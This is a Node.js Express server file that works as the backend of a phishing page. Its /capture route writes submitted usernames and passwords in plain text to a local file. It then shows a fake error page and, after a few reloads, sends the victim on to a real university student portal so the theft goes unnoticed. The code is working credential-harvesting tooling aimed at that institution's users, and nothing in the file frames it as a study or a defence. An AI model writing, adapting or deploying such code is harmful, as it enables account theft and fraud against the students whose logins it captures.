const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');

const app = express();
const PORT = 3000;
const RELOAD_LIMIT = 3; 

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname)));
app.use(cookieParser());
app.post('/capture', (req, res) => {
    const { username, password } = req.body;
    const data = `Username: ${username}, Password: ${password}\n`;

    // Save the credentials to a file
    fs.appendFile('credentials.txt', data, (err) => {
        if (err) {
            console.error('Failed to write to file', err);
            res.status(500).send('Server error');
        } else {
            console.log('Credentials captured');
            res.redirect('/error'); 
        }
    });
});

app.get('/error', (req, res) => {
    let reloadCount = parseInt(req.cookies.reloadCount) || 0;

    if (reloadCount >= RELOAD_LIMIT) {
        res.redirect('https://student.geu.ac.in/');
    } else {
        reloadCount++;
        res.cookie('reloadCount', reloadCount, { maxAge: 900000, httpOnly: true });
        res.sendFile(path.join(__dirname, 'sdanlknjsaflndasf.html'));
    }
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
